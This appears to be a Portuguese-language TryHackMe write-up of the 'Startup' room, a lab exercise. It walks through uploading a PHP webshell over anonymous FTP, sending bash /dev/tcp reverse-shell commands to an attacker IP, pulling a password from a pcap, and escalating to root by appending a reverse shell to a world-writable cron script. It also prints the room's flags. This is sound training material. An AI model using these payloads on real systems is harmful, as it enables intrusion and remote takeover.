# Startup - TryHackMe Write-up

![Startup](https://img.shields.io/badge/Startup-green) ![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue) ![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute     | Details               |
|---------------|-----------------------|
| **Name**      | Startup                |
| **Platform**  | TryHackMe              |
| **Difficulty**| Easy                   |
| **OS**        | Linux (Ubuntu)         |
| **Date Completed** | March 2026        |

---

## Learning Objectives

- Enumeração de múltiplos serviços (FTP, HTTP, SSH) com Nmap
- Identificação e exploração de FTP anônimo com permissão de escrita
- Upload e execução de webshell PHP via servidor web
- Análise de captura de tráfego (`.pcapng`) para extração de credenciais
- Escalada de privilégio por exploração de cronjob com script writeable

---

## Attack Chain

```
RECON      →  nmap -sC -sV -p- | gobuster dir | ftp anonymous
FOOTHOLD   →  shell.php upload via FTP → RCE via HTTP
SHELL      →  bash -i >& /dev/tcp/IP/4444 0>&1  (nc -lvnp 4444)
POST-EXP   →  /recipe.txt + /incidents/suspicious.pcapng
CREDS      →  strings pcap | grep -i PASS  →  c4ntg3t3n0ughsp1c3
LATERAL    →  su lennie  →  user.txt
PRIVESC    →  cron root → planner.sh → /etc/print.sh (writeable)
ROOT       →  echo revshell >> /etc/print.sh  →  aguardar cron  →  root.txt
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- -T4 <IP_ALVO> -oN startup_nmap.txt
```

**Resultado:**

| Porta  | Serviço | Versão              | Observação                  |
|--------|---------|---------------------|-----------------------------|
| 21/tcp | FTP     | vsftpd 3.0.3        | Login anônimo **permitido** |
| 22/tcp | SSH     | OpenSSH 7.2p2       | —                           |
| 80/tcp | HTTP    | Apache 2.4.18       | —                           |

> **Raciocínio ofensivo:** FTP anônimo com permissão de escrita é de baixo risco isolado. A pergunta real é: esse diretório FTP é o mesmo que o servidor web serve? Se sim, o vetor de RCE está montado sem nenhum exploit — apenas por configuração inadequada.

### Directory Enumeration

```bash
gobuster dir \
  -u http://<IP_ALVO> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -t 50
```

O diretório `/files` foi retornado com status **200**. Ao acessá-lo via browser, o conteúdo era idêntico ao exposto pelo FTP — confirmando que ambos apontavam para o mesmo caminho no sistema de arquivos.

---

## Initial Access

### Webshell Upload via FTP

```bash
# Conexão FTP anônima
ftp <IP_ALVO>
# user: anonymous | password: (vazio)

# Verificar permissões de escrita
ls -la

# Mudar para modo binário antes do upload
binary

# Upload da webshell
put shell.php
```

**Webshell utilizada:**

```php
<?php system($_GET["cmd"]); ?>
```

Minimalista por design: menos código reduz superfície para assinaturas de WAF e antivírus.

### Confirmação de RCE

```bash
curl "http://<IP_ALVO>/files/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

```bash
# Terminal 1 — listener no Kali
nc -lvnp 4444

# Terminal 2 — payload via curl
# O caractere & precisa ser URL encoded (%26) para não ser
# interpretado pelo shell local como separador de processo
curl "http://<IP_ALVO>/files/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<KALI_IP>/4444+0>%261'"
```

> **Por que `/dev/tcp`?** No Bash, `/dev/tcp/host/porta` é um arquivo especial que abre uma conexão TCP ao ser lido ou escrito. Ao redirecionar stdin/stdout/stderr para ele, o Bash transmite a sessão interativa pela rede sem depender de nenhum binário externo como `nc` ou `socat`.

### Shell Stabilization

```bash
# No terminal recebido (www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z para suspender
stty raw -echo; fg

# De volta ao terminal remoto
export TERM=xterm
stty rows 40 cols 140
```

---

## Post-Exploitation

### Filesystem Recon

```bash
cat /etc/passwd | grep -v nologin | grep -v false
ls /
ls /incidents
```

Dois arquivos relevantes foram encontrados:

- `recipe.txt` — continha a primeira flag da room
- `/incidents/suspicious.pcapng` — captura de tráfego para análise

### PCAP Analysis

Capturas de tráfego deixadas em disco durante investigações de incidentes são frequentemente esquecidas pelos administradores. Quando protocolos em texto claro como FTP estão presentes, credenciais ficam preservadas no histórico do tráfego.

```bash
# Opção 1 — Transferência para análise local (Wireshark)
cd /incidents && python3 -m http.server 8080
# No Kali:
wget http://<IP_ALVO>:8080/suspicious.pcapng

# Opção 2 — Análise direta com strings
strings /incidents/suspicious.pcapng | grep -i "pass" -A 2
```

**Credencial extraída:** `lennie : c4ntg3t3n0ughsp1c3`

O tráfego FTP capturado transmitia autenticação em texto claro — comportamento esperado no protocolo FTP sem TLS.

### Lateral Movement

```bash
su lennie
# Password: c4ntg3t3n0ughsp1c3

cat /home/lennie/user.txt
```

---

## Privilege Escalation

### Cronjob Enumeration

```bash
sudo -l     # Sem entradas para lennie
cat /etc/crontab
```

Uma tarefa executada pelo usuário `root` a cada minuto chamava o script `/scripts/planner.sh`.

### Script Analysis

```bash
cat /scripts/planner.sh
```

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

O script chamava `/etc/print.sh`. A verificação de permissões revelou o ponto de entrada:

```bash
ls -la /etc/print.sh
# -rwxrwxrwx 1 root root ... /etc/print.sh
```

> **O erro do administrador:** `/etc/print.sh` tem permissão `777` — qualquer usuário pode escrever nele. Como ele é executado pelo `root` via cron, qualquer código injetado por `lennie` roda com privilégios máximos no próximo ciclo. É um caso clássico de *insecure file permissions + privileged script execution*.

### Exploitation

```bash
# Listener no Kali
nc -lvnp 5555

# Injeção no script writeable (como lennie)
# >> adiciona ao arquivo sem sobrescrever o conteúdo existente
echo "bash -i >& /dev/tcp/<KALI_IP>/5555 0>&1" >> /etc/print.sh

# Aguardar até 60 segundos pelo cron disparar
```

```bash
cat /root/root.txt
```

---

## Flags

| Arquivo      | Caminho           | Flag                                     |
|--------------|-------------------|------------------------------------------|
| `recipe.txt` | `/`               | `love`                                   |
| `user.txt`   | `/home/lennie/`   | `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}` |
| `root.txt`   | `/root/`          | `THM{f963aaa6a430f210222158ae15c3d76d}` |

---

## Key Takeaways

**FTP anônimo com escrita + diretório compartilhado com o servidor web** é uma das configurações mais perigosas que existem. Nenhum dos dois serviços é vulnerável por si só — é a relação entre eles que constrói o vetor.

**Capturas de tráfego em disco são fontes de inteligência.** Varrer o filesystem em busca de `.pcap`, `.pcapng` e `.cap` deve fazer parte do checklist padrão de pós-exploração.

**Permissões de arquivo importam mais do que a maioria dos administradores percebe.** Um único arquivo com `777` em caminho chamado por root foi suficiente para comprometer o sistema inteiro. Em engajamentos reais:

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

---

## Tools Used

| Ferramenta   | Finalidade                              |
|--------------|-----------------------------------------|
| `nmap`       | Varredura de portas e detecção de serviço |
| `gobuster`   | Enumeração de diretórios web            |
| `ftp`        | Acesso ao servidor FTP anônimo          |
| `netcat`     | Listener para reverse shell             |
| `strings`    | Extração de texto de binário/PCAP       |
| `python3`    | Estabilização de PTY e servidor HTTP    |

---

## References

- [GTFOBins](https://gtfobins.github.io) — exploits de binários SUID/sudo
- [RevShells](https://www.revshells.com) — gerador de payloads com URL encoding
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*
